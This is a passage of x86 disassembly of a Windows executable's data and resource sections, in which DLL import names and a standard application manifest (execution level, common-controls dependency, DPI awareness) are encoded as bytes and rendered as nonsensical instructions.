  4033d8:	arpl   WORD PTR [ebp+0x73],sp
  4033db:	jae    0x4033dd
  4033dd:	add    BYTE PTR [ecx+0x70],ah
  4033e0:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  4033ea:	outs   dx,DWORD PTR ds:[esi]
  4033eb:	jb     0x403452
  4033ed:	sub    eax,0x636e7973
  4033f2:	push   0x2d316c2d
  4033f7:	xor    ch,BYTE PTR ds:0x6c642e30
  4033fd:	ins    BYTE PTR es:[edi],dx
  4033fe:	add    BYTE PTR [eax],al
  403400:	popa   
  403401:	jo     0x40346c
  403403:	sub    eax,0x772d736d
  403408:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  40340f:	sub    eax,0x636f7270
  403414:	gs jae 0x40348a
  403417:	je     0x403481
  403419:	jb     0x403480
  40341b:	popa   
  40341c:	fs jae 0x40344c
  40341f:	ins    BYTE PTR es:[edi],dx
  403420:	xor    DWORD PTR ds:0x2e322d31,ebp
  403426:	fs ins BYTE PTR es:[edi],dx
  403428:	ins    BYTE PTR es:[edi],dx
  403429:	add    BYTE PTR [ecx+0x70],ah
  40342c:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  403436:	outs   dx,DWORD PTR ds:[esi]
  403437:	jb     0x40349e
  403439:	sub    eax,0x6f727265
  40343e:	jb     0x4034a8
  403440:	popa   
  403441:	outs   dx,BYTE PTR ds:[esi]
  403442:	fs ins BYTE PTR es:[edi],dx
  403444:	imul   ebp,DWORD PTR [esi+0x67],0x2d316c2d
  40344b:	xor    DWORD PTR ds:0x6c642e31,ebp
  403451:	ins    BYTE PTR es:[edi],dx
  403452:	add    BYTE PTR [eax],al
  403454:	popa   
  403455:	jo     0x4034c0
  403457:	sub    eax,0x772d736d
  40345c:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  403463:	sub    eax,0x7262696c
  403468:	popa   
  403469:	jb     0x4034e4
  40346b:	ins    BYTE PTR es:[edi],dx
  40346c:	outs   dx,DWORD PTR ds:[esi]
  40346d:	popa   
  40346e:	fs gs jb 0x40349f
  403472:	ins    BYTE PTR es:[edi],dx
  403473:	xor    DWORD PTR ds:0x2e302d32,ebp
  403479:	fs ins BYTE PTR es:[edi],dx
  40347b:	ins    BYTE PTR es:[edi],dx
  40347c:	add    BYTE PTR [eax],al
  40347e:	popa   
  40347f:	jo     0x4034ea
  403481:	sub    eax,0x772d736d
  403486:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  40348d:	sub    eax,0x666f7270
  403492:	imul   ebp,DWORD PTR [ebp+eiz*2+0x2d],0x312d316c
  40349a:	sub    eax,0x6c642e30
  40349f:	ins    BYTE PTR es:[edi],dx
  4034a0:	add    BYTE PTR [eax],al
  4034a2:	popa   
  4034a3:	jo     0x40350e
  4034a5:	sub    eax,0x772d736d
  4034aa:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  4034b1:	sub    eax,0x69737973
  4034b6:	outs   dx,BYTE PTR ds:[esi]
  4034b7:	outs   dx,WORD PTR ds:[esi]
  4034b9:	sub    eax,0x322d316c
  4034be:	sub    eax,0x6c642e31
  4034c3:	ins    BYTE PTR es:[edi],dx
	...

Disassembly of section .rsrc:

00404000 <.rsrc>:
	...
  40400c:	add    DWORD PTR [eax],eax
  40400e:	add    al,0x0
  404010:	sub    BYTE PTR [ebx],al
  404012:	add    BYTE PTR [eax-0x7fffffc8],al
  404018:	add    eax,DWORD PTR [eax]
  40401a:	add    BYTE PTR [eax],al
  40401c:	push   eax
  40401d:	add    BYTE PTR [eax],al
  40401f:	or     BYTE PTR [esi],0x0
  404022:	add    BYTE PTR [eax],al
  404024:	mov    al,0x0
  404026:	add    BYTE PTR [eax+0x10],al
  40402c:	enter  0x0,0x80
  404030:	sbb    BYTE PTR [eax],al
  404032:	add    BYTE PTR [eax],al
  404034:	loopne 0x404036
  404036:	add    BYTE PTR [eax+0x0],al
	...
  404044:	add    BYTE PTR [eax],al
  404046:	add    DWORD PTR [eax],eax
  404048:	add    DWORD PTR [eax],eax
  40404a:	add    BYTE PTR [eax],al
  40404c:	clc    
  40404d:	add    BYTE PTR [eax],al
  40404f:	add    BYTE PTR [eax],0x0
	...
  40405e:	or     al,BYTE PTR [eax]
  404060:	add    DWORD PTR [eax],eax
  404062:	add    BYTE PTR [eax],al
  404064:	adc    BYTE PTR [ecx],al
  404066:	add    BYTE PTR [eax+0x2],al
  40406c:	sub    BYTE PTR [ecx],al
  40406e:	add    BYTE PTR [eax+0x3],al
  404074:	inc    eax
  404075:	add    DWORD PTR [eax],eax
  404077:	add    BYTE PTR [eax+eax*1],0x0
  40407b:	add    BYTE PTR [eax+0x1],bl
  40407e:	add    BYTE PTR [eax+0x5],al
  404084:	jo     0x404087
  404086:	add    BYTE PTR [eax+0x6],al
  40408c:	mov    BYTE PTR [ecx],al
  40408e:	add    BYTE PTR [eax+0x7],al
  404094:	mov    al,ds:0x8800001
  404099:	add    BYTE PTR [eax],al
  40409b:	add    BYTE PTR [eax+0x9800001],bh
  4040a1:	add    BYTE PTR [eax],al
  4040a3:	add    al,dl
  4040a5:	add    DWORD PTR [eax],eax
  4040a7:	or     BYTE PTR [edx],0x0
  4040aa:	add    BYTE PTR [eax],al
  4040ac:	call   0xc040b2
	...
  4040bd:	add    BYTE PTR [ecx],al
  4040bf:	add    BYTE PTR [ecx+0x1f],al
  4040c2:	add    BYTE PTR [eax],al
  4040c4:	add    BYTE PTR [edx],al
  4040c6:	add    BYTE PTR [eax+0x0],al
	...
  4040d4:	add    BYTE PTR [eax],al
  4040d6:	add    DWORD PTR [eax],eax
  4040d8:	add    DWORD PTR [eax],eax
  4040da:	add    BYTE PTR [eax],al
  4040dc:	sbb    BYTE PTR [edx],al
  4040de:	add    BYTE PTR [eax+0x0],al
	...
  4040ec:	add    BYTE PTR [eax],al
  4040ee:	add    DWORD PTR [eax],eax
  4040f0:	add    DWORD PTR [eax],eax
  4040f2:	add    BYTE PTR [eax],al
  4040f4:	xor    BYTE PTR [edx],al
  4040f6:	add    BYTE PTR [eax+0x0],al
	...
  404104:	add    BYTE PTR [eax],al
  404106:	add    DWORD PTR [eax],eax
  404108:	or     DWORD PTR [eax+eax*1],eax
  40410b:	add    BYTE PTR [eax+0x2],cl
	...
  40411e:	add    DWORD PTR [eax],eax
  404120:	or     DWORD PTR [eax+eax*1],eax
  404123:	add    BYTE PTR [eax+0x2],bl
	...
  404136:	add    DWORD PTR [eax],eax
  404138:	or     DWORD PTR [eax+eax*1],eax
  40413b:	add    BYTE PTR [eax+0x2],ch
	...
  40414e:	add    DWORD PTR [eax],eax
  404150:	or     DWORD PTR [eax+eax*1],eax
  404153:	add    BYTE PTR [eax+0x2],bh
	...
  404166:	add    DWORD PTR [eax],eax
  404168:	or     DWORD PTR [eax+eax*1],eax
  40416b:	add    BYTE PTR [eax+0x2],cl
	...
  40417d:	add    BYTE PTR [ecx],al
  40417f:	add    BYTE PTR [ecx],cl
  404181:	add    al,0x0
  404183:	add    BYTE PTR [eax+0x2],bl
	...
  404195:	add    BYTE PTR [ecx],al
  404197:	add    BYTE PTR [ecx],cl
  404199:	add    al,0x0
  40419b:	add    BYTE PTR [eax+0x2],ch
	...
  4041ad:	add    BYTE PTR [ecx],al
  4041af:	add    BYTE PTR [ecx],cl
  4041b1:	add    al,0x0
  4041b3:	add    BYTE PTR [eax+0x2],bh
	...
  4041c5:	add    BYTE PTR [ecx],al
  4041c7:	add    BYTE PTR [ecx],cl
  4041c9:	add    al,0x0
  4041cb:	add    al,cl
  4041cd:	add    al,BYTE PTR [eax]
	...
  4041db:	add    BYTE PTR [eax],al
  4041dd:	add    BYTE PTR [ecx],al
  4041df:	add    BYTE PTR [ecx],cl
  4041e1:	add    al,0x0
  4041e3:	add    al,bl
  4041e5:	add    al,BYTE PTR [eax]
	...
  4041f3:	add    BYTE PTR [eax],al
  4041f5:	add    BYTE PTR [ecx],al
  4041f7:	add    BYTE PTR [ecx],cl
  4041f9:	add    al,0x0
  4041fb:	add    al,ch
  4041fd:	add    al,BYTE PTR [eax]
	...
  40420b:	add    BYTE PTR [eax],al
  40420d:	add    BYTE PTR [ecx],al
  40420f:	add    BYTE PTR [ecx],cl
  404211:	add    al,0x0
  404213:	add    al,bh
  404215:	add    al,BYTE PTR [eax]
	...
  404223:	add    BYTE PTR [eax],al
  404225:	add    BYTE PTR [ecx],al
  404227:	add    BYTE PTR [ecx],cl
  404229:	add    al,0x0
  40422b:	add    BYTE PTR [eax],cl
  40422d:	add    eax,DWORD PTR [eax]
	...
  40423b:	add    BYTE PTR [eax],al
  40423d:	add    BYTE PTR [ecx],al
  40423f:	add    BYTE PTR [ecx],cl
  404241:	add    al,0x0
  404243:	add    BYTE PTR [eax],bl
  404245:	add    eax,DWORD PTR [eax]
  404247:	add    BYTE PTR [eax+0x66],al
  40424a:	add    DWORD PTR [eax],eax
  40424c:	rol    BYTE PTR [eax],1
	...
  404256:	add    BYTE PTR [eax],al
  404258:	adc    BYTE PTR [eax+0x0],cl
  40425b:	add    BYTE PTR [eax+0x6],ch
	...
  404266:	add    BYTE PTR [eax],al
  404268:	js     0x4042b8
  40426a:	add    BYTE PTR [eax],al
  40426c:	call   0x404273
  404271:	add    BYTE PTR [eax],al
  404273:	add    BYTE PTR [eax],al
  404275:	add    BYTE PTR [eax],al
  404277:	add    BYTE PTR [eax+0x51],ah
  40427a:	add    BYTE PTR [eax],al
  40427c:	sub    BYTE PTR [ecx],al
	...
  404286:	add    BYTE PTR [eax],al
  404288:	mov    BYTE PTR [edx+0x0],dl
  40428b:	add    BYTE PTR [eax+0xe],ch
  404291:	add    BYTE PTR [eax],al
  404293:	add    BYTE PTR [eax],al
  404295:	add    BYTE PTR [eax],al
  404297:	add    BYTE PTR [eax],dh
  404299:	popa   
  40429a:	add    BYTE PTR [eax],al
  40429c:	test   al,0x8
	...
  4042a6:	add    BYTE PTR [eax],al
  4042a8:	fsubr  DWORD PTR [ecx+0x0]
  4042ab:	add    BYTE PTR [eax+0x5],ch
	...
  4042b6:	add    BYTE PTR [eax],al
  4042b8:	inc    eax
  4042b9:	outs   dx,DWORD PTR ds:[esi]
  4042ba:	add    BYTE PTR [eax],al
  4042bc:	call   0x404378
  4042c1:	add    BYTE PTR [eax],al
  4042c3:	add    BYTE PTR [eax],al
  4042c5:	add    BYTE PTR [eax],al
  4042c7:	add    BYTE PTR [eax],ch
  4042c9:	daa    
  4042ca:	add    DWORD PTR [eax],eax
  4042cc:	test   al,0x25
	...
  4042d6:	add    BYTE PTR [eax],al
  4042d8:	ror    BYTE PTR [ecx+eax*1+0x0],1
  4042dc:	test   al,0x10
	...
  4042e6:	add    BYTE PTR [eax],al
  4042e8:	js     0x404347
  4042ea:	add    DWORD PTR [eax],eax
  4042ec:	push   0x4
  4042f1:	add    BYTE PTR [eax],al
  4042f3:	add    BYTE PTR [eax],al
  4042f5:	add    BYTE PTR [eax],al
  4042f7:	add    al,ah
  4042f9:	popa   
  4042fa:	add    DWORD PTR [eax],eax
  4042fc:	xchg   edx,eax
	...
  404305:	add    BYTE PTR [eax],al
  404307:	add    BYTE PTR [eax+0x62],bh
  40430a:	add    DWORD PTR [eax],eax
  40430c:	enter  0x3,0x0
	...
  404318:	xor    BYTE PTR [ebx+0x0],al
  40431b:	add    cl,bl
  40431d:	add    al,0x0
	...
  404327:	add    BYTE PTR [ebx],al
  404329:	add    BYTE PTR [ebp+0x0],cl
  40432c:	push   ebp
  40432d:	add    BYTE PTR [ecx+0x0],cl
  404330:	cmp    al,0x3f
  404332:	js     0x4043a1
  404334:	ins    BYTE PTR es:[edi],dx
  404335:	and    BYTE PTR [esi+0x65],dh
  404338:	jb     0x4043ad
  40433a:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  404341:	xor    BYTE PTR [edx],ah
  404343:	and    BYTE PTR [ebp+0x6e],ah
  404346:	arpl   WORD PTR [edi+0x64],bp
  404349:	imul   ebp,DWORD PTR [esi+0x67],0x5455223d
  404350:	inc    esi
  404351:	sub    eax,0x73202238
  404356:	je     0x4043b9
  404358:	outs   dx,BYTE PTR ds:[esi]
  404359:	fs popa 
  40435b:	ins    BYTE PTR es:[edi],dx
  40435c:	outs   dx,DWORD PTR ds:[esi]
  40435d:	outs   dx,BYTE PTR ds:[esi]
  40435e:	gs cmp eax,0x73657922
  404364:	and    bh,BYTE PTR [edi]
  404366:	ds or  eax,0x2d213c0a
  40436c:	sub    eax,0x706f4320
  404371:	jns    0x4043e5
  404373:	imul   esp,DWORD PTR [edi+0x68],0x63282074
  40437a:	sub    DWORD PTR [eax],esp
  40437c:	dec    ebp
  40437d:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  404384:	je     0x4043a6
  404386:	inc    ebx
  404387:	outs   dx,DWORD PTR ds:[esi]
  404388:	jb     0x4043fa
  40438a:	outs   dx,DWORD PTR ds:[esi]
  40438b:	jb     0x4043ee
  40438d:	je     0x4043f8
  40438f:	outs   dx,DWORD PTR ds:[esi]
  404390:	outs   dx,BYTE PTR ds:[esi]
  404391:	and    BYTE PTR ds:0xa0d3e2d,ch
  404397:	cmp    al,0x61
  404399:	jae    0x40440e
  40439b:	gs ins DWORD PTR es:[edi],dx
  40439d:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  4043a1:	js     0x404410
  4043a3:	ins    BYTE PTR es:[edi],dx
  4043a4:	outs   dx,BYTE PTR ds:[esi]
  4043a5:	jae    0x4043e4
  4043a7:	and    dh,BYTE PTR [ebp+0x72]
  4043aa:	outs   dx,BYTE PTR ds:[esi]
  4043ab:	cmp    dh,BYTE PTR [ebx+0x63]
  4043ae:	push   0x73616d65
  4043b3:	sub    eax,0x7263696d
  4043b8:	outs   dx,DWORD PTR ds:[esi]
  4043b9:	jae    0x40442a
  4043bb:	data16 je 0x4043eb
  4043be:	arpl   WORD PTR [edi+0x6d],bp
  4043c1:	cmp    ah,BYTE PTR [ecx+0x73]
  4043c4:	ins    DWORD PTR es:[edi],dx
  4043c5:	cs jbe 0x4043f9
  4043c8:	and    ah,BYTE PTR [eax]
  4043ca:	and    BYTE PTR [eax+0x6d],bh
  4043cd:	ins    BYTE PTR es:[edi],dx
  4043ce:	outs   dx,BYTE PTR ds:[esi]
  4043cf:	jae    0x40440b
  4043d1:	popa   
  4043d2:	jae    0x404441
  4043d4:	jbe    0x404409
  4043d6:	cmp    eax,0x6e727522
  4043db:	cmp    dh,BYTE PTR [ebx+0x63]
  4043de:	push   0x73616d65
  4043e3:	sub    eax,0x7263696d
  4043e8:	outs   dx,DWORD PTR ds:[esi]
  4043e9:	jae    0x40445a
  4043eb:	data16 je 0x40441b
  4043ee:	arpl   WORD PTR [edi+0x6d],bp
  4043f1:	cmp    ah,BYTE PTR [ecx+0x73]
  4043f4:	ins    DWORD PTR es:[edi],dx
  4043f5:	cs jbe 0x40442b
  4043f8:	and    ah,BYTE PTR [eax]
  4043fa:	ins    DWORD PTR es:[edi],dx
  4043fb:	popa   
  4043fc:	outs   dx,BYTE PTR ds:[esi]
  4043fd:	imul   esp,DWORD PTR [esi+0x65],0x65567473
  404404:	jb     0x404479
  404406:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  40440d:	xor    BYTE PTR [edx],ah
  40440f:	ds or  eax,0x73613c0a
  404415:	jae    0x40447c
  404417:	ins    DWORD PTR es:[edi],dx
  404418:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  40441c:	fs outs dx,BYTE PTR gs:[esi]
  40441f:	je     0x40448a
  404421:	je     0x40449c
  404423:	or     eax,0x7270090a
  404428:	outs   dx,DWORD PTR ds:[esi]
  404429:	arpl   WORD PTR [ebp+0x73],sp
  40442c:	jae    0x40449d
  40442e:	jb     0x404471
  404430:	jb     0x404495
  404432:	push   0x63657469
  404437:	je     0x4044ae
  404439:	jb     0x4044a0
  40443b:	cmp    eax,0x36387822
  404440:	and    cl,BYTE PTR ds:0x6576090a
  404446:	jb     0x4044bb
  404448:	imul   ebp,DWORD PTR [edi+0x6e],0x2e35223d
  40444f:	xor    DWORD PTR [esi],ebp
  404451:	xor    BYTE PTR [esi],ch
  404453:	xor    BYTE PTR [edx],ah
  404455:	or     eax,0x616e090a
  40445a:	ins    DWORD PTR es:[edi],dx
  40445b:	gs cmp eax,0x63694d22
  404461:	jb     0x4044d2
  404463:	jae    0x4044d4
  404465:	data16 je 0x404496
  404468:	push   edi
  404469:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
  404470:	push   ebx
  404471:	jns    0x4044e6
  404473:	je     0x4044da
  404475:	ins    DWORD PTR es:[edi],dx
  404476:	push   eax
  404477:	jb     0x4044e8
  404479:	jo     0x4044e0
  40447b:	jb     0x4044f1
  40447d:	imul   esp,DWORD PTR [ebp+0x73],0x64726148
  404484:	ja     0x4044e7
  404486:	jb     0x4044ed
  404488:	and    ah,BYTE PTR [eax]
  40448a:	je     0x404505
  40448c:	jo     0x4044f3
  40448e:	cmp    eax,0x6e697722
  404493:	xor    esi,DWORD PTR [edx]
  404495:	and    ah,BYTE PTR [eax]
  404497:	das    
  404498:	ds or  eax,0x65643c0a
  40449e:	jae    0x404503
  4044a0:	jb     0x40450b
  4044a2:	jo     0x404518
  4044a4:	imul   ebp,DWORD PTR [edi+0x6e],0x7261483e
  4044ab:	fs ja  0x40450f
  4044ae:	jb     0x404515
  4044b0:	and    BYTE PTR [ebx+0x65],dl
  4044b3:	je     0x404529
  4044b5:	imul   ebp,DWORD PTR [esi+0x67],0x642f3c73
  4044bc:	gs jae 0x404522
  4044bf:	jb     0x40452a
  4044c1:	jo     0x404537
  4044c3:	imul   ebp,DWORD PTR [edi+0x6e],0x3c0a0d3e
  4044ca:	fs gs jo 0x404533
  4044ce:	outs   dx,BYTE PTR ds:[esi]
  4044cf:	fs outs dx,BYTE PTR gs:[esi]
  4044d2:	arpl   WORD PTR [ecx+0x3e],di
  4044d5:	or     eax,0x2020200a
  4044da:	and    BYTE PTR [esp+eiz*2],bh
  4044dd:	gs jo  0x404545
  4044e0:	outs   dx,BYTE PTR ds:[esi]
  4044e1:	fs outs dx,BYTE PTR gs:[esi]
  4044e4:	je     0x404527
  4044e6:	jae    0x40455b
  4044e8:	gs ins DWORD PTR es:[edi],dx
  4044ea:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  4044ee:	or     eax,0x2020200a
  4044f3:	and    BYTE PTR [eax],ah
  4044f5:	and    BYTE PTR [eax],ah
  4044f7:	and    BYTE PTR [ecx+eiz*2],bh
  4044fa:	jae    0x40456f
  4044fc:	gs ins DWORD PTR es:[edi],dx
  4044fe:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  404502:	fs outs dx,BYTE PTR gs:[esi]
  404505:	je     0x404570
  404507:	je     0x404582
  404509:	or     eax,0x2020200a
  40450e:	and    BYTE PTR [eax],ah
  404510:	and    BYTE PTR [eax],ah
  404512:	and    BYTE PTR [eax],ah
  404514:	and    BYTE PTR [eax],ah
  404516:	and    BYTE PTR [ecx+edi*2+0x70],dh
  40451a:	gs cmp eax,0x6e697722
  404520:	xor    esi,DWORD PTR [edx]
  404522:	and    cl,BYTE PTR ds:0x2020200a
  404528:	and    BYTE PTR [eax],ah
  40452a:	and    BYTE PTR [eax],ah
  40452c:	and    BYTE PTR [eax],ah
  40452e:	and    BYTE PTR [eax],ah
  404530:	and    BYTE PTR [esi+0x61],ch
  404533:	ins    DWORD PTR es:[edi],dx
  404534:	gs cmp eax,0x63694d22
  40453a:	jb     0x4045ab
  40453c:	jae    0x4045ad
  40453e:	data16 je 0x40456f
  404541:	push   edi
  404542:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
  404549:	inc    ebx
  40454a:	outs   dx,DWORD PTR ds:[esi]
  40454b:	ins    DWORD PTR es:[edi],dx
  40454c:	ins    DWORD PTR es:[edi],dx
  40454d:	outs   dx,DWORD PTR ds:[esi]
  40454e:	outs   dx,BYTE PTR ds:[esi]
  40454f:	sub    eax,0x746e6f43
  404554:	jb     0x4045c5
  404556:	ins    BYTE PTR es:[edi],dx
  404557:	jae    0x40457b
  404559:	or     eax,0x2020200a
  40455e:	and    BYTE PTR [eax],ah
  404560:	and    BYTE PTR [eax],ah
  404562:	and    BYTE PTR [eax],ah
  404564:	and    BYTE PTR [eax],ah
  404566:	and    BYTE PTR [esi+0x65],dh
  404569:	jb     0x4045de
  40456b:	imul   ebp,DWORD PTR [edi+0x6e],0x2e36223d
  404572:	xor    BYTE PTR [esi],ch
  404574:	xor    BYTE PTR [esi],ch
  404576:	xor    BYTE PTR [edx],ah
  404578:	or     eax,0x2020200a
  40457d:	and    BYTE PTR [eax],ah
  40457f:	and    BYTE PTR [eax],ah
  404581:	and    BYTE PTR [eax],ah
  404583:	and    BYTE PTR [eax],ah
  404585:	and    BYTE PTR [eax+0x75],dh
  404588:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  40458c:	dec    ebx
  40458d:	gs jns 0x4045e4
  404590:	outs   dx,DWORD PTR ds:[esi]
  404591:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  404595:	and    dh,BYTE PTR [esi]
  404597:	xor    eax,0x36623539
  40459c:	xor    al,0x31
  40459e:	xor    al,0x34
  4045a0:	arpl   WORD PTR [ebx+0x66],sp
  4045a3:	xor    DWORD PTR [esi+eiz*2+0x22],esp
  4045a7:	or     eax,0x2020200a
  4045ac:	and    BYTE PTR [eax],ah
  4045ae:	and    BYTE PTR [eax],ah
  4045b0:	and    BYTE PTR [eax],ah
  4045b2:	and    BYTE PTR [eax],ah
  4045b4:	and    BYTE PTR [eax+0x72],dh
  4045b7:	outs   dx,DWORD PTR ds:[esi]
  4045b8:	arpl   WORD PTR [ebp+0x73],sp
  4045bb:	jae    0x40462c
  4045bd:	jb     0x404600
  4045bf:	jb     0x404624
  4045c1:	push   0x63657469
  4045c6:	je     0x40463d
  4045c8:	jb     0x40462f
  4045ca:	cmp    eax,0x36387822
  4045cf:	and    cl,BYTE PTR ds:0x2020200a
  4045d5:	and    BYTE PTR [eax],ah
  4045d7:	and    BYTE PTR [eax],ah
  4045d9:	and    BYTE PTR [edi],ch
  4045db:	ds or  eax,0x2020200a
  4045e1:	and    BYTE PTR [edi+ebp*1],bh
  4045e4:	fs gs jo 0x40464d
  4045e8:	outs   dx,BYTE PTR ds:[esi]
  4045e9:	fs outs dx,BYTE PTR gs:[esi]
  4045ec:	je     0x40462f
  4045ee:	jae    0x404663
  4045f0:	gs ins DWORD PTR es:[edi],dx
  4045f2:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  4045f6:	or     eax,0x642f3c0a
  4045fb:	gs jo  0x404663
  4045fe:	outs   dx,BYTE PTR ds:[esi]
  4045ff:	fs outs dx,BYTE PTR gs:[esi]
  404602:	arpl   WORD PTR [ecx+0x3e],di
  404605:	or     eax,0x72743c0a
  40460a:	jne    0x40467f
  40460c:	je     0x404657
  40460e:	outs   dx,BYTE PTR ds:[esi]
  40460f:	outs   dx,WORD PTR ds:[esi]
  404611:	and    BYTE PTR [eax+0x6d],bh
  404614:	ins    BYTE PTR es:[edi],dx
  404615:	outs   dx,BYTE PTR ds:[esi]
  404616:	jae    0x404655
  404618:	and    dh,BYTE PTR [ebp+0x72]
  40461b:	outs   dx,BYTE PTR ds:[esi]
  40461c:	cmp    dh,BYTE PTR [ebx+0x63]
  40461f:	push   0x73616d65
  404624:	sub    eax,0x7263696d
  404629:	outs   dx,DWORD PTR ds:[esi]
  40462a:	jae    0x40469b
  40462c:	data16 je 0x40465c
  40462f:	arpl   WORD PTR [edi+0x6d],bp
  404632:	cmp    ah,BYTE PTR [ecx+0x73]
  404635:	ins    DWORD PTR es:[edi],dx
  404636:	cs jbe 0x40466c
  404639:	and    bh,BYTE PTR [esi]
  40463b:	or     eax,0x2020200a
  404640:	and    BYTE PTR [ebx+esi*2],bh
  404643:	arpl   WORD PTR gs:[ebp+0x72],si
  404647:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  40464f:	and    BYTE PTR [eax],ah
  404651:	and    BYTE PTR [eax],ah
  404653:	and    BYTE PTR [eax],ah
  404655:	cmp    al,0x72
  404657:	gs jno 0x4046cf
  40465a:	gs jae 0x4046d1
  40465d:	gs fs push eax
  404660:	jb     0x4046cb
  404662:	jbe    0x4046cd
  404664:	ins    BYTE PTR es:[edi],dx
  404665:	gs addr16 gs jae 0x4046a8
  40466a:	or     eax,0x2020200a
  40466f:	and    BYTE PTR [eax],ah
  404671:	and    BYTE PTR [eax],ah
  404673:	and    BYTE PTR [eax],ah
  404675:	and    BYTE PTR [eax],ah
  404677:	and    BYTE PTR [edx+esi*2],bh
  40467a:	gs jno 0x4046f2
  40467d:	gs jae 0x4046f4
  404680:	gs fs inc ebp
  404683:	js     0x4046ea
  404685:	arpl   WORD PTR [ebp+0x74],si
  404688:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  40468f:	ins    BYTE PTR es:[edi],dx
  404690:	or     eax,0x2020200a
  404695:	and    BYTE PTR [eax],ah
  404697:	and    BYTE PTR [eax],ah
  404699:	and    BYTE PTR [eax],ah
  40469b:	and    BYTE PTR [eax],ah
  40469d:	and    BYTE PTR [eax],ah
  40469f:	and    BYTE PTR [eax],ah
  4046a1:	and    BYTE PTR [ebp+eiz*2+0x76],ch
  4046a5:	gs ins BYTE PTR es:[edi],dx
  4046a7:	cmp    eax,0x71657222
  4046ac:	jne    0x404717
  4046ae:	jb     0x404715
  4046b0:	inc    ecx
  4046b1:	fs ins DWORD PTR es:[edi],dx
  4046b3:	imul   ebp,DWORD PTR [esi+0x69],0x61727473
  4046ba:	je     0x40472b
  4046bc:	jb     0x4046e0
  4046be:	or     eax,0x2020200a
  4046c3:	and    BYTE PTR [eax],ah
  4046c5:	and    BYTE PTR [eax],ah
  4046c7:	and    BYTE PTR [eax],ah
  4046c9:	and    BYTE PTR [eax],ah
  4046cb:	and    BYTE PTR [eax],ah
  4046cd:	and    BYTE PTR [eax],ah
  4046cf:	and    BYTE PTR [ebp+0x69],dh
  4046d2:	inc    ecx
  4046d3:	arpl   WORD PTR [ebx+0x65],sp
  4046d6:	jae    0x40474b
  4046d8:	cmp    eax,0x6c616622
  4046dd:	jae    0x404744
  4046df:	and    cl,BYTE PTR ds:0x2020200a
  4046e5:	and    BYTE PTR [eax],ah
  4046e7:	and    BYTE PTR [eax],ah
  4046e9:	and    BYTE PTR [eax],ah
  4046eb:	and    BYTE PTR [eax],ah
  4046ed:	and    BYTE PTR [edi],ch
  4046ef:	ds or  eax,0x2020200a
  4046f5:	and    BYTE PTR [eax],ah
  4046f7:	and    BYTE PTR [eax],ah
  4046f9:	and    BYTE PTR [edi+ebp*1],bh
  4046fc:	jb     0x404763
  4046fe:	jno    0x404775
  404700:	gs jae 0x404777
  404703:	gs fs push eax
  404706:	jb     0x404771
  404708:	jbe    0x404773
  40470a:	ins    BYTE PTR es:[edi],dx
  40470b:	gs addr16 gs jae 0x40474e
  404710:	or     eax,0x2020200a
  404715:	and    BYTE PTR [edi+ebp*1],bh
  404718:	jae    0x40477f
  40471a:	arpl   WORD PTR [ebp+0x72],si
  40471d:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x2f3c0a0d
  404725:	je     0x404799
  404727:	jne    0x40479c
  404729:	je     0x404774
  40472b:	outs   dx,BYTE PTR ds:[esi]
  40472c:	outs   dx,WORD PTR ds:[esi]
  40472e:	ds or  eax,0x73613c0a
  404734:	ins    DWORD PTR es:[edi],dx
  404735:	jbe    0x40476a
  404737:	cmp    ah,BYTE PTR [ecx+0x70]
  40473a:	jo     0x4047a8
  40473c:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  404743:	ds or  eax,0x2020200a
  404749:	cmp    al,0x61
  40474b:	jae    0x4047ba
  40474d:	jbe    0x404782
  40474f:	cmp    dh,BYTE PTR [edi+0x69]
  404752:	outs   dx,BYTE PTR ds:[esi]
  404753:	outs   dx,DWORD PTR fs:[esi]
  404755:	ja     0x4047ca
  404757:	push   ebx
  404758:	gs je  0x4047cf
  40475b:	imul   ebp,DWORD PTR [esi+0x67],0x6d782073
  404762:	ins    BYTE PTR es:[edi],dx
  404763:	outs   dx,BYTE PTR ds:[esi]
  404764:	jae    0x4047a3
  404766:	and    ch,BYTE PTR [eax+0x74]
  404769:	je     0x4047db
  40476b:	cmp    ch,BYTE PTR [edi]
  40476d:	das    
  40476e:	jae    0x4047d3
  404770:	push   0x73616d65
  404775:	cs ins DWORD PTR es:[edi],dx
  404777:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40477e:	je     0x4047ae
  404780:	arpl   WORD PTR [edi+0x6d],bp
  404783:	das    
  404784:	push   ebx
  404785:	dec    ebp
  404786:	dec    ecx
  404787:	das    
  404788:	xor    dh,BYTE PTR [eax]
  40478a:	xor    BYTE PTR ds:0x6e69572f,dh
  404790:	outs   dx,DWORD PTR fs:[esi]
  404792:	ja     0x404807
  404794:	push   ebx
  404795:	gs je  0x40480c
  404798:	imul   ebp,DWORD PTR [esi+0x67],0xd3e2273
  40479f:	or     ah,BYTE PTR [eax]
  4047a1:	and    BYTE PTR [eax],ah
  4047a3:	and    BYTE PTR [eax],ah
  4047a5:	and    BYTE PTR [eax],ah
  4047a7:	and    BYTE PTR [ecx+eiz*2],bh
  4047aa:	jne    0x404820
  4047ac:	outs   dx,DWORD PTR ds:[esi]
  4047ad:	inc    ebp
  4047ae:	ins    BYTE PTR es:[edi],dx
  4047af:	gs jbe 0x404813
  4047b2:	je     0x404819
  4047b4:	ds je  0x404829
  4047b7:	jne    0x40481e
  4047b9:	cmp    al,0x2f
  4047bb:	popa   
  4047bc:	jne    0x404832
